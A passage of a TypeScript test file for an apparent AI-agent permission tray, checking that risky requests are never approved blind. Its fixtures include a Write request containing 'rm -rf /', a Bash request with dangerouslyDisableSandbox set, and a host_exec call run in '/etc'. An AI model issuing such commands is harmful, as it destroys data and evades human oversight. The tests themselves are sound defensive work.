  /** The scroller is 1000px tall without the tray and 800px with it (the tray takes room from the transcript). */
  function stubScroll(t: ReturnType<typeof setup>) {
    const scroll = t.q('.ct-orch-sheet-scroll')!;
    let top = 0;
    const height = () => (t.q('.ct-orch-tray') ? 800 : 1000);
    Object.defineProperty(scroll, 'scrollHeight', { configurable: true, get: height });
    Object.defineProperty(scroll, 'clientHeight', { configurable: true, get: () => 300 });
    Object.defineProperty(scroll, 'scrollTop', { configurable: true, get: () => top, set: (v: number) => { top = Math.min(v, height() - 300); } });
    return { scroll, top: () => top, setTop: (v: number) => { top = v; } };
  }

  it('pinned to the latest message before: re-pinned after the tray resized the transcript', async () => {
    const t = setup({ specs: [] });
    const s = stubScroll(t);
    s.setTop(700); // at the bottom (1000 - 300)
    s.scroll.dispatchEvent(new Event('scroll'));
    t.addPermission({ id: 'n', title: 'Ship it', kind: 'permission' }); // the tray appears AFTER the transcript rendered: the bottom is now 500
    expect(s.top()).toBe(500);
    t.resolveElsewhere('n'); // and goes away again: the bottom is back at 700
    expect(s.top()).toBe(700);
  });

  it('the user had scrolled up: the tray changing does not yank them back down', async () => {
    const t = setup({ specs: [] });
    const s = stubScroll(t);
    s.setTop(700); s.scroll.dispatchEvent(new Event('scroll')); // at the bottom
    s.setTop(100); s.scroll.dispatchEvent(new Event('scroll')); // then up, well away from it: unpinned (#903's rule)
    t.addPermission({ id: 'n', title: 'Ship it', kind: 'permission' });
    expect(s.top()).toBe(100);
  });
});


describe('QA O1: the heading count is the dot count', () => {
  it('"Needs you (N)" equals the number the dot tooltip reports as needing you (Needs-you lane + Awaiting lane, failures excluded)', () => {
    const t = setup({ specs: [...DEFAULT, { id: 'f', title: 'Failed', kind: 'failed' }] });
    const heading = Number(/\((\d+)\)/.exec(t.q('.ct-orch-tray-title')!.textContent!)![1]);
    const dot = Number(/(\d+) needs? you/.exec(t.q('[data-testid="orchestrator-dot"]')!.getAttribute('title')!)![1]);
    expect(heading).toBe(3);
    expect(heading).toBe(dot);
  });
});

describe('QA O3: repeated clicks resolve exactly once', () => {
  it('three SYNCHRONOUS clicks on one button in one task: one resolvePermission call', async () => {
    const t = setup({ specs: [DEFAULT[0]] });
    t.manager.resolvePermission.mockImplementation(() => {}); // the prompt stays pending (the worst case)
    const allow = t.btn('p', 'Allow')!;
    allow.click(); allow.click(); allow.click();
    await flush();
    expect(t.manager.resolvePermission).toHaveBeenCalledTimes(1);
  });

  it('three clicks across microtasks: still one call', async () => {
    const t = setup({ specs: [DEFAULT[0]] });
    t.manager.resolvePermission.mockImplementation(() => {});
    const allow = t.btn('p', 'Allow')!;
    allow.click();
    await Promise.resolve(); allow.click();
    await Promise.resolve(); await Promise.resolve(); allow.click();
    expect(t.manager.resolvePermission).toHaveBeenCalledTimes(1);
  });

  it('clicking different buttons of the same card in one task: one call (Deny then Allow)', () => {
    const t = setup({ specs: [DEFAULT[0]] });
    t.manager.resolvePermission.mockImplementation(() => {});
    t.btn('p', 'Deny')!.click(); t.btn('p', 'Allow')!.click(); t.btn('p', 'Always')!.click();
    expect(t.manager.resolvePermission).toHaveBeenCalledTimes(1);
    expect(t.manager.resolvePermission).toHaveBeenCalledWith('p', false);
  });
});

describe('QA D2: the heading bar (title + Show more / fewer) is one sticky unit above the list', () => {
  const five: Spec[] = Array.from({ length: 5 }, (_, i) => ({ id: `t${i}`, title: `Thread ${i}`, kind: 'permission' as const, tool: 'Bash', detail: `cmd ${i}` }));
  it('the heading and the toggle share .ct-orch-tray-bar, which precedes the list', () => {
    const t = setup({ specs: five });
    const bar = t.q('.ct-orch-tray-bar')!;
    expect(bar.querySelector('.ct-orch-tray-title')).toBeTruthy();
    expect(bar.querySelector('.ct-orch-tray-toggle')).toBeTruthy();
    expect(bar.nextElementSibling).toBe(t.q('.ct-orch-tray-list'));
  });
  it('three or fewer: the bar has just the heading', () => {
    const t = setup();
    expect(t.q('.ct-orch-tray-bar .ct-orch-tray-toggle')).toBeNull();
    expect(t.q('.ct-orch-tray-bar .ct-orch-tray-title')).toBeTruthy();
  });
});


describe('"never approved blind" covers hidden FIELDS, not only length (review: required)', () => {
  const spec = (detail: string, tool = 'Bash'): Spec[] => [{ id: 'h', title: 'Hidden stuff', kind: 'permission', tool, detail }];
  const names = (t: ReturnType<typeof setup>) => [...t.card('h')!.querySelectorAll('.ct-orch-tray-actions button:not([hidden])')].map((b) => b.textContent);

  it('{command, dangerouslyDisableSandbox}: Deny + Review in thread only, the full JSON in the title', () => {
    const detail = JSON.stringify({ command: 'ls', dangerouslyDisableSandbox: true });
    const t = setup({ specs: spec(detail) });
    expect(names(t)).toEqual(['Deny', 'Review in thread']);
    expect(t.card('h')!.querySelector('.ct-orch-tray-detail')!.getAttribute('title')).toContain('dangerouslyDisableSandbox');
  });

  it('a Write with file_path + content: Deny + Review in thread only', () => {
    const t = setup({ specs: spec(JSON.stringify({ file_path: '/r/a.ts', content: 'rm -rf /' }), 'Write') });
    expect(names(t)).toEqual(['Deny', 'Review in thread']);
  });

  it('a single short command is still approvable inline (Deny / Allow / Always)', () => {
    const t = setup({ specs: spec(JSON.stringify({ command: 'ls -la' })) });
    expect(names(t)).toEqual(['Deny', 'Allow', 'Always']);
  });

  it('non-JSON text: approvable only when fully shown', () => {
    expect(names(setup({ specs: spec('npm run deploy --prod') }))).toEqual(['Deny', 'Allow', 'Always']);
    expect(names(setup({ specs: spec('q'.repeat(300)) }))).toEqual(['Deny', 'Review in thread']);
    expect(names(setup({ specs: spec('first line\nsecond line') }))).toEqual(['Deny', 'Review in thread']); // multi-line plain text can hide lines when flattened
  });

  it('host_exec: command only keeps Allow once / Always `prefix`; an extra field does not', () => {
    const only = `Run host_exec for a remote thread: ${JSON.stringify({ command: 'git status' })}`;
    const more = `Run host_exec for a remote thread: ${JSON.stringify({ command: 'git status', cwd: '/etc' })}`;
    expect(names(setup({ specs: spec(only, 'mcp__claude_threads__host_exec') }))).toEqual(['Deny', 'Allow once', 'Always `git status`']);
    expect(names(setup({ specs: spec(more, 'mcp__claude_threads__host_exec') }))).toEqual(['Deny', 'Review in thread']);
  });

  it('Review in thread opens the thread and resolves nothing', () => {
    const t = setup({ specs: spec(JSON.stringify({ command: 'ls', dangerouslyDisableSandbox: true })) });
    t.btn('h', 'Review in thread')!.click();
    expect(t.deps.openThread).toHaveBeenCalledWith('h');
    expect(t.manager.resolvePermission).not.toHaveBeenCalled();
  });
});

describe('focus survives the busy / re-enable cycle (review advisory 2)', () => {
  it('the clicked button gets focus back when the action did not take and the card is re-enabled', async () => {
    const t = setup({ specs: [DEFAULT[0]] });
    t.manager.resolvePermission.mockImplementation(() => {}); // still pending: re-enabled afterwards
    const allow = t.btn('p', 'Allow')!;
    allow.focus();
    allow.click();
    await tick();
    expect(allow.disabled).toBe(false);
    expect(document.activeElement).toBe(allow);
  });
});

describe('compact form (K2 P5 batch 4): never approve blind', () => {
  const short = [{ id: 'p', title: 'Deploy curation', kind: 'permission' as const, tool: 'Bash', detail: JSON.stringify({ command: 'npm run deploy --prod' }) }];
  const hidden = (el: Element | null | undefined) => !!el && (el as HTMLElement).hidden;

  it('a fully shown command keeps inline Allow / Always in the full form; a hand-off exists but is hidden and named after tool + title', () => {
    const t = setup({ specs: short });
    expect(hidden(t.btn('p', 'Allow'))).toBe(false);
    expect(hidden(t.btn('p', 'Always'))).toBe(false);
    const review = t.btn('p', 'Review in thread')!;
    expect(review.hasAttribute('data-compact-only')).toBe(true);
    expect(review.hidden).toBe(true);
    expect(review.getAttribute('aria-label')).toMatch(/Bash/);
    expect(review.getAttribute('aria-label')).toContain('Deploy curation');
    expect(t.btn('p', 'Allow')!.hasAttribute('data-hide-compact')).toBe(true);
    expect(t.btn('p', 'Always')!.hasAttribute('data-hide-compact')).toBe(true);
    expect(t.btn('p', 'Deny')!.hasAttribute('data-hide-compact')).toBe(false);
  });

  it('applyTrayMode(compact): Allow / Always are hidden (not focusable), Deny and "Review in thread" are shown; back to full restores', () => {
    const t = setup({ specs: short });
    const tray = t.tray()!;
    applyTrayMode(tray, { compact: true, collapsed: false });
    expect(tray.hasAttribute('data-compact')).toBe(true);
    expect(hidden(t.btn('p', 'Allow'))).toBe(true);
    expect(hidden(t.btn('p', 'Always'))).toBe(true);
    expect(hidden(t.btn('p', 'Deny'))).toBe(false);
    expect(hidden(t.btn('p', 'Review in thread'))).toBe(false);
    applyTrayMode(tray, { compact: false, collapsed: false });
    expect(tray.hasAttribute('data-compact')).toBe(false);
    expect(hidden(t.btn('p', 'Allow'))).toBe(false);
    expect(hidden(t.btn('p', 'Review in thread'))).toBe(true);
  });

  it('a detail that was NOT fully shown never had inline Allow; its Review button is always visible (not compact-only)', () => {
    const t = setup({ specs: [{ id: 'l', title: 'Long', kind: 'permission', tool: 'Bash', detail: JSON.stringify({ command: 'x'.repeat(300) }) }] });
    expect(t.btn('l', 'Allow')).toBeUndefined();
    const review = t.btn('l', 'Review in thread')!;
    expect(review.hasAttribute('data-compact-only')).toBe(false);
    applyTrayMode(t.tray()!, { compact: true, collapsed: false });
    expect(hidden(review)).toBe(false);
    applyTrayMode(t.tray()!, { compact: false, collapsed: false });
    expect(hidden(review)).toBe(false);
  });

  it('focus on a button that gets hidden moves to "Review in thread" of the same card (never to the page)', () => {
    const t = setup({ specs: short });
    t.btn('p', 'Allow')!.focus();
    expect(document.activeElement).toBe(t.btn('p', 'Allow'));
    applyTrayMode(t.tray()!, { compact: true, collapsed: false });
    expect(document.activeElement).toBe(t.btn('p', 'Review in thread'));
  });

  it('compact -> full -> Allow resolves exactly once (the guard and the single resolve path are unchanged)', async () => {
    const t = setup({ specs: short });
    applyTrayMode(t.tray()!, { compact: true, collapsed: false });
    applyTrayMode(t.tray()!, { compact: false, collapsed: false });
    t.btn('p', 'Allow')!.click();
    await new Promise((r) => setTimeout(r, 20));
    expect(t.manager.resolvePermission).toHaveBeenCalledTimes(1);
    expect(t.manager.resolvePermission.mock.calls[0][1]).toBe(true);
  });

  it('Review in thread (compact) opens the thread and resolves nothing', () => {
    const t = setup({ specs: short });
    applyTrayMode(t.tray()!, { compact: true, collapsed: false });
    t.btn('p', 'Review in thread')!.click();
    expect(t.deps.openThread).toHaveBeenCalledWith('p');
    expect(t.manager.resolvePermission).not.toHaveBeenCalled();
  });

  it('collapsed: the list is hidden and a one-row "Review" hands off to the FIRST thread (no approval buttons)', () => {
    const t = setup({ specs: short });
    const tray = t.tray()!;
    applyTrayMode(tray, { compact: true, collapsed: true });
    expect(tray.hasAttribute('data-collapsed')).toBe(true);
    const row = tray.querySelector<HTMLButtonElement>('.ct-orch-tray-collapsed-review')!;
    expect(row.hidden).toBe(false);
    expect(row.getAttribute('aria-label')).toMatch(/need you|Review/i);
    row.click();
    expect(t.deps.openThread).toHaveBeenCalledWith('p');
    expect(t.manager.resolvePermission).not.toHaveBeenCalled();
    applyTrayMode(tray, { compact: false, collapsed: false });
    expect(row.hidden).toBe(true);
  });
});

describe('D13: one focus-rescue routine for every tray form change (never <body>)', () => {
  const short = [{ id: 'p', title: 'Deploy curation', kind: 'permission' as const, tool: 'Bash', detail: JSON.stringify({ command: 'npm run deploy --prod' }) }, { id: 'q', title: 'Mobile layout polish', kind: 'question' as const }];
  const sheetOf = (t: ReturnType<typeof setup>) => (t.dock as unknown as { sheet: { keepTrayFocus(fn: () => void): void } }).sheet;
  const active = () => document.activeElement;

  it('full -> compact: Allow (hidden) -> the card\'s Review in thread', () => {
    const t = setup({ specs: short });
    const allow = t.btn('p', 'Allow')!;
    allow.focus();
    sheetOf(t).keepTrayFocus(() => { allow.blur(); applyTrayMode(t.tray()!, { compact: true, collapsed: false }, null); });
    expect(active()).toBe(t.btn('p', 'Review in thread'));
  });

  it('compact -> compact (a different keyboard height): focus stays on the SAME logical control even though the measuring toggles dropped it', () => {
    const t = setup({ specs: short });
    applyTrayMode(t.tray()!, { compact: true, collapsed: false });
    const review = t.btn('p', 'Review in thread')!;
    review.focus();
    sheetOf(t).keepTrayFocus(() => {
      review.blur(); // the measuring toggles hide it for a moment...
      applyTrayMode(t.tray()!, { compact: false, collapsed: false }, null);
      applyTrayMode(t.tray()!, { compact: true, collapsed: false }, null);
    });
    expect(active()).toBe(t.btn('p', 'Review in thread'));
  });

  it('compact -> collapsed -> full -> hidden: never body, and always inside the sheet', () => {
    const t = setup({ specs: short });
    const tray = t.tray()!;
    applyTrayMode(tray, { compact: true, collapsed: false });
    const review = t.btn('p', 'Review in thread')!;
    review.focus();
    sheetOf(t).keepTrayFocus(() => { review.blur(); applyTrayMode(tray, { compact: true, collapsed: true }, null); });
    const row = tray.querySelector<HTMLElement>('.ct-orch-tray-collapsed-review')!;
    expect(active()).toBe(row);
    sheetOf(t).keepTrayFocus(() => { row.blur(); applyTrayMode(tray, { compact: false, collapsed: false }, null); });
    expect(active()).not.toBe(document.body);
    expect(t.q('.ct-orch-sheet')!.contains(active())).toBe(true);
    const deny = t.btn('p', 'Deny')!;
    deny.focus();
    sheetOf(t).keepTrayFocus(() => { deny.blur(); tray.hidden = true; });
    expect(active()).not.toBe(document.body);
    expect(t.q('.ct-orch-sheet')!.contains(active())).toBe(true);
  });

  it('a user who clicks away (focus leaves the tray on purpose) is NOT pulled back by a later form change', () => {
    const t = setup({ specs: short });
    t.btn('p', 'Deny')!.focus();
    (t.q('.ct-orch-input') as HTMLElement | null)?.focus();
    const outside = document.createElement('button');
    document.body.appendChild(outside);
    outside.focus();
    sheetOf(t).keepTrayFocus(() => { applyTrayMode(t.tray()!, { compact: true, collapsed: false }, null); });
    expect(active()).toBe(outside);
  });

  it('D17: a fallback target that is display:none (hidden by CSS, not [hidden]) is skipped: focus falls through to the next real target', () => {
    const t = setup({ specs: short });
    const tray = t.tray()!;
    const toggle = document.createElement('button');
    toggle.className = 'ct-orch-tray-toggle';
    toggle.textContent = 'Show 2 more';
    tray.querySelector('.ct-orch-tray-bar')!.appendChild(toggle);
    toggle.focus();
    expect(active()).toBe(toggle);
    sheetOf(t).keepTrayFocus(() => {
      toggle.blur();
      toggle.style.display = 'none'; // what the collapsed form's CSS does to the toggle: not [hidden], still connected
      tray.hidden = true; // and the whole tray is gone: nothing in it can take focus
    });
    expect(active()).not.toBe(document.body);
    expect(active()).not.toBe(toggle);
    expect(t.q('.ct-orch-sheet')!.contains(active())).toBe(true);
  });

  it('D17: when focus() does nothing for a chosen target the chain continues (verified by document.activeElement)', () => {
    const t = setup({ specs: short });
    const tray = t.tray()!;
    applyTrayMode(tray, { compact: true, collapsed: false });
    const review = t.btn('p', 'Review in thread')!;
    review.focus();
    const original = review.focus.bind(review);
    review.focus = () => { /* a target that silently refuses focus */ };
    sheetOf(t).keepTrayFocus(() => { review.blur(); });
    review.focus = original;
    expect(active()).not.toBe(document.body);
    expect(active()).not.toBe(review);
  });
});

